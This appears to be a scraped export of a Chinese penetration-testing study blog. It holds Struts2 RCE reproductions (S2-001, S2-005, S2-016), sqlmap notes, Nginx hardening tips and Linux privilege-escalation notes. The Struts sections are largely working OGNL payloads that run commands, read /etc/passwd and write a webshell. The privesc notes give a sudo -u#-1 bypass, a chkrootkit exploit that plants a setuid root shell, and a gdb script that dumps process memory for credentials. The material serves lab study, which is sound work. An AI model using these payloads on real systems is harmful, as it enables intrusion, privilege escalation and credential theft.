poc12执行命令：%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e 执行ls，查看文件 1$&#123;#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q&#125;.action 执行失败，需要转url编码（可以使用火狐自带hackbar） 1/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action S2-016 复现影响版本: 2.0.0 - 2.3.15 原理在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。 所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式。 poc执行命令，通过火狐将表达式转url编码 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125; 获取web目录： 1redirect:$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;)),#ot.flush(),#ot.close()&#125; 写入webshell： 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath(&quot;/&quot;)).append(@java.io.File@separator).append(&quot;1.jspx&quot;).toString()),#b.write(#a.getParameter(&quot;t&quot;).getBytes()),#b.close(),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(&quot;BINGO&quot;),#genxor.flush(),#genxor.close()&#125;","categories":[],"tags":[]},{"title":"","slug":"Struts2漏洞S2-005复现","date":"2024-02-26T02:25:19.070Z","updated":"2022-04-08T17:19:05.417Z","comments":true,"path":"2024/02/26/Struts2漏洞S2-005复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9ES2-005%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（s2-005）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2漏洞S2-005复现笔记S2-005复现漏洞原理1s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开 影响版本：Struts 2.0.0-2.1.8.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-005 运行以下命令启动环境 12docker-compose builddocker-compose up -d 搭建成功： 构建poc使用抓包工具burp suite，修改数据包插入poc 1(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 Poc2： 1?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27 查看数据连接状态命令： 1docker exec -it c25543ef6c4c /bin/bash ls &#x2F;tmp","categories":[],"tags":[]},{"title":"","slug":"Struts2漏洞S2-001复现","date":"2024-02-26T02:25:19.069Z","updated":"2022-04-08T17:20:08.720Z","comments":true,"path":"2024/02/26/Struts2漏洞S2-001复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9ES2-001%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（s2-001）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2 漏洞S2-001复现学习笔记S2-001复现原理：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。 漏洞环境搭建https://github.com/vulhub/vulhub/tree/master/struts2/s2-001 运行以下命令进行设置 12docker-compose builddocker-compose up -d 访问 http://127.0.0.1:8080/ 漏洞poc测试1.输入**%{‘123’}**，sumbit 2.返回123，参数值，证明漏洞存在 构造poc 获取tomcat路径：1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 语句执行后，查看返回的语句信息： 获取网站真实路径：1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125; 构造查看权限的poc：123456789101112131415161718192021%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行任意命令只需要将上面的poc中whoami替换：12345678910111213141516171819%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行命令（带参数的命令：new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;）：1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 关闭docker环境1命令：docker-compose down -v","categories":[],"tags":[]},{"title":"","slug":"sqlmap学习笔记","date":"2024-02-26T02:25:19.067Z","updated":"2022-04-08T17:17:37.016Z","comments":true,"path":"2024/02/26/sqlmap学习笔记/","permalink":"http://example.com/2024/02/26/sqlmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"123456789title: sqlmap学习笔记tags: - 渗透测试 - sqlmap - 漏洞分析categories: - 渗透测试 - 漏洞分析 - sqlmap Sqlmap学习笔记sqlmap介绍123456sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等其他功能:执行命令、列举用户、检测权限、自动破解、数据导出等功能。 基本参数12345678910111213141516171819202122sqlmap.py -h 查看帮助is-dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数:列表名columns 参数:列字段dump 参数:下载数据--dump 获取表中的数据，包含列 --dump-all 转存DBMS数据库所有表项目--level 测试等级(1-5)，默认为1读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容-D 指定数据库-T 指定表-C 指定列--dbms=mysql oracle mssql 指定数据库--users 枚举所有用户--passwords 枚举所有用户密码--roles 列出数据库管理员角色--privileges 列出数据库管理员权限 列举数据库系统的架构 1sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs 探测等级12345参数：--level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。 显示调式信息123456789-v 显示调试信息 有7个级别0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。 风险等级123456789参数：--risk共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。 获取目标123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136参数：-u或者--url格式：http(s)://targeturl[:port]/[…]例如：python sqlmap.py -u http://www.target.com/vuln.php?id=1从文本中获取多个目标扫描参数：-m文件中保存url格式如下，sqlmap会一个一个检测www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1*参数：-rsqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。比如文本文件内如下：POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1参数：-gsqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。例子：python sqlmap.py -g &quot;inurl:php?id=&quot;--data此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。例子：python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”--param-del参数拆分字符当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。例子：python sqlmap.py -u &quot;http://www.cracer.com/vuln.php&quot; --data=&quot;query=foobar;d=1&quot; --param-del=&quot;;&quot; --cookie适用于cookie注入将参加加入cookie注入测试sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2--referersqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。--headers可以通过--headers参数来增加额外的http头--hearders “client-ip: 1.1.1.1&#x27;”--proxy使用--proxy代理是格式为：http://url:port。--proxy=http://127.0.0.1:1080--proxy-file c:/1.txt--delay可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。--timeout可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。设定重试超时--retries当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。设定随机改变的参数值--technique这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入）默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。--union-char默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。二阶SQL注入有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址.--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。可以在一下三种情况下使用：-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。参数：-ssqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。保存HTTP(S)日志参数：-t这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。--batch用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。强制使用字符编码--charset不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：--charset=GBK--flush-session如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。自动获取form表单测试--hex有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：例子：sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors--output-dirsqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：--output-dir=/tmp从响应中获取DBMS的错误信息参数：--parse-errors有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。--smart有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。例子：$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot; --batch --smart--mobile有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。例如：$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile--identify-wafsqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。--check-wafWAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试例如对一个受到ModSecurity WAF保护的MySQL例子：$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --identify-waf -v 3 注册表12345678910111213当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。读取注册表值参数：--reg-read写入注册表值参数：--reg-add删除注册表值参数：--reg-del注册表辅助选项参数：--reg-key，--reg-value，--reg-data，--reg-type需要配合之前三个参数使用，例子：$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 暴力破解表12345678910111213141516171819参数：--common-tables当使用--tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。3、当前用户没有权限读取系统中保存数据结构的表的权限。暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。Xx --common-tables -D testdb参数：--common-columns与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。Xx --common-columns -T text -D testdb注入点：http://testasp.vulnweb.com/Login.asp几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass sqlmap -u http://testasp.vulnweb.com/Login.asp --forms sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot; 搜索框注入1sqlmap.py -r search-test.txt 伪静态注入12注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.htmlsqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html base64编码注入1sqlmap -u http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5 --tamper base64encode.py –dbs 请求时间延迟12参数：--time-sec当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒 执行sql语句123456--sql-query=&quot;select @@version&quot;--sql-shellsqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。 文件读写1234567从数据库服务器中读取文件参数：--file-read当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。sqlmap.py -u &quot;http://192.168.2.3:81/about/show.php?lang=cn&amp;id=22&quot; --file-read=&quot;C:\\Inetpub\\wwwroot\\mysql-php\\1.php&quot; 文件上传12345参数：--file-write,--file-dest当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。sqlmap.py -u &quot;http://192.168.2.129/article.php?id=5&quot; --file-write=&quot;C:\\1.php&quot; --file-dest=&quot;/var/www/html/x.php&quot; 命令执行123456789参数：--os-cmd,--os-shell当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。cmd 执行cmd命令（win）shell 执行当前用户命令 --os-shell自动上传 脚本文件返回shell waf1234注入点:http://192.168.159.1/news.php?id=1sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;space2hash.py base64encode.py charencode.py","categories":[],"tags":[]},{"title":"Nginx学习","slug":"Nginx中间件的安全与加固","date":"2024-02-26T02:25:19.046Z","updated":"2022-04-08T17:36:06.418Z","comments":true,"path":"2024/02/26/Nginx中间件的安全与加固/","permalink":"http://example.com/2024/02/26/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8%E4%B8%8E%E5%8A%A0%E5%9B%BA/","excerpt":"","text":"Nginx1.常用功能1234 反向代理​ 负载均衡​ http服务器​ 正向代理 反向代理： 123以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将服务器上得到的结果返回给Internet上的请求连接的客户端。 真实的服务器不能直接被外部网络访问，所以使用一台代理服务器。 负载均衡： 123分摊到多个操作单元上进行执行。例如web服务器，ftp服务器，企业关键应用， 多台服务器，根据随机规则将请求分发到指定服务器进行处理 一般需要配置反向代理，通过反向代理跳转到负载均衡。 负载均衡策略： 12345678910111.RR默认（Round-Robin） 轮询调度，按时间顺序逐一分配，若服务器down，能自动剔除。2.权重 轮询几率，weight和访问比率成正比，用于服务器性能不均的情况。3.ip_hash 以上的方式，可能造成下一个请求可能分配到其他服务器。（seission断开） 解决每个请求按照访问的ip的hash结果分配，确保每个访客固定访问一个后端服务器，解决session问题。4.fair（第三方） 按照服务器响应时间来分配，响应时间短的优先分配。5.url_hash(第三方) 按照url的hash的结果分配请求，按照url定向到同一个服务器，后端服务器为缓存时比较有效。 HTTP服务器： 1静态服务器，只有静态资源的时候，同时现在流行的动静分离，也可以用nginx实现。 正向代理：（客户端） 1客户端和原始服务器之间的，为了从原始服务器获得内容，客户端发送请求，代理服务器转交请求并返回内容。 2.Nginx安全检查和加固详解1.身份鉴别 12345a. 以低权限启动账户身份启动服务Unix&amp;Linux： ps -ef|grep nginx 查看进程账户是否为专用非root账号b. 弱口令 使用扫描器进行扫描，人工输入与用户名相同的密码 2.安全审计 12345a. 错误日志(日记级别：debug|info|notice|warn(建议级别)|error|crit|emerg) 编辑nginx.conf文件（eg:/usr/local/nginx/conf/nginx.conf）,去掉error_Log前面的“#”号b. 记录访问日志 应该设置access_log文件格式 配置日志功能，对访问进行记录 3.资源控制 123456789101是否限制ip访问 敏感目录的ip2客户端的请求读取时间 设置body，header读取时间 超时4083客户端保持活动的超时时间 keepalive4响应客户端超时时间sendtimeout5是否限制客户端下载的并发数6.客户端的下载速度7配置防盗链接设置 客户端请求的referer，ip 4.其他安全 1231检查是否自定义的错误信息2检查是否隐藏nginx版本信息","categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/tags/Nginx/"}]},{"title":"","slug":"linux提取学习笔记","date":"2024-02-26T02:25:19.041Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2024/02/26/linux提取学习笔记/","permalink":"http://example.com/2024/02/26/linux%E6%8F%90%E5%8F%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"linux提权学习笔记操作系统信息123(cat /proc/version || uname -a ) 2&gt;/dev/nulllsb_release -a 2&gt;/dev/null # old, not by default on many systemscat /etc/os-release 2&gt;/dev/null # universal PATH 如果您对变量内的任何文件夹具有写入权限，您可能能够劫持一些库或二进制文件：**PATH** 1echo $PATH 环境信息 1(env || set) 2&gt;/dev/null 内核版本 123cat /proc/versionuname -asearchsploit &quot;Linux Kernel&quot; 编译的漏洞： 12345github.com/lucyoa/kernel-exploitsgithub.com/bwbwbwbw/linux-exploit-binariesgithub.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack 可以帮助搜索内核漏洞的工具 12https://github.com/mzet-/linux-exploit-suggesterhttps://github.com/jondonas/linux-exploit-suggester-2 CVE-2016-5195（脏牛）Linux 权限提升 - Linux 内核 &lt;&#x3D; 3.19.0-73.8 12345# make dirtycow stableecho 0 &gt; /proc/sys/vm/dirty_writeback_centisecsg++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCshttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c Sudo version123searchsploit sudosudo -V | grep &quot;Sudo ver&quot; | grep &quot;1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]&quot; 123456789101112sudo -V | grep &#x27;Sudo version&#x27; 查看是否受影响的版本，低于1.8.29有漏洞修改配置文件：vim/etc/sudoers 在root(ALL:ALL)ALL添加一行test ALL=(ALL,!root)ALLuseradd test passwd testsu - testsudo -u#-1 id -u 或sudo -u#4294967295 id -usudo -u#-1 whoamisudo -u#-1 sh 检查已安装和未安装的内容、位置 1234ls /dev 2&gt;/dev/null | grep -i &quot;sd&quot;cat /etc/fstab 2&gt;/dev/null | grep -v &quot;^#&quot; | grep -Pv &quot;\\W*\\#&quot; 2&gt;/dev/null#Check if credentials in fstabgrep -E &quot;(user|username|login|pass|password|pw|credentials)[=:]&quot; /etc/fstab /etc/mtab 2&gt;/dev/null 枚举有用的二进制文件 1which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null 检查是否安装了任何编译器 1(dpkg --list 2&gt;/dev/null | grep &quot;compiler&quot; | grep -v &quot;decompiler\\|lib&quot; 2&gt;/dev/null || yum list installed &#x27;gcc*&#x27; 2&gt;/dev/null | grep gcc 2&gt;/dev/null; which gcc g++ 2&gt;/dev/null || locate -r &quot;/gcc[0-9\\.-]\\+$&quot; 2&gt;/dev/null | grep -v &quot;/doc/&quot;) 检查已安装包和服务的版本 12dpkg -l #Debianrpm -qa #Centos 可以使用openVAS检查机器内安装的过时和易受攻击的软件 查看正在执行的进程并检查是否有任何进程具有****比它应有的更多权限 123ps auxps -eftop -n 1 有权访问 FTP 服务的内存 123456gdb -p &lt;FTP_PROCESS_PID&gt;(gdb) info proc mappings 信息过程映射(gdb) q(gdb) dump memory /tmp/mem_ftp &lt;START_HEAD&gt; &lt;END_HEAD&gt;(gdb) qstrings /tmp/mem_ftp #用户和密码 gdb脚本 12345678#!/bin/bash#./dump-memory.sh &lt;PID&gt;grep rw-p /proc/$1/maps \\ | sed -n &#x27;s/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p&#x27; \\ | while read start stop; do \\ gdb --batch --pid $1 -ex \\ &quot;dump memory $1-$start-$stop.dump 0x$start 0x$stop&quot;; \\done 内核溢出提权123456789查看内核uname -r反弹shell执行命令上传exp编译执行根据内核版本查找对应漏洞收集exp可以从www.exploit-db.com查找漏洞利用 linux-exploit-suggerster123https://github.com/mungurk/linux-exploit-suggester.sh/blob/master/linux-exploit-suggester.shchmod 777 x.sh./x.sh mysql UDF 提权12上传库文件执行库文件创建命令执行函数 利用SUID提权12寻找系统里可以用的SUID文件来提权$ find / -perm -u=s -type f 2&gt;/dev/null 利用环境变量劫持高权限程序提权1234第一步：查找可操作文件$ find / -perm -u=s -type f 2&gt;/dev/null第二步：利用file 命令查看文件是否可执行 •执行该文件 •在执行的时候可能会报错，根据报错来查看调用系统命令 利用chkrootkit &lt;0.49版本提权123456789101112131415161718191.如果发现Linux服务器存在chkrootkit并且版本小于0.492.上传一个利用脚本到/tmp目录下并编译#include &lt;unistd.h&gt;void main(void)&#123;system(&quot;chown root:root /tmp/update&quot;);system(&quot;chmod 4755 /tmp/update&quot;);setuid(0);setgid(0);execl(&quot;/bin/sh&quot;,&quot;sh&quot;,NULL);&#125;保存为update.c进入到/tmp目录下gcc -o update update.c然后等着管理员运行chkrootkit命令检测系统后门在发现/tmp/update 所有者会变成root这时候你在进入/tmp运行update./update 内网端口转发1234567内网主机输入命令lcx.exe -slave 外网ip 外网端口 内网ip 内网端口lcx.exe -slave 200.1.1.1 1111 192.168.1.2 3389外网主机输入命令lcx.exe -listen 1111 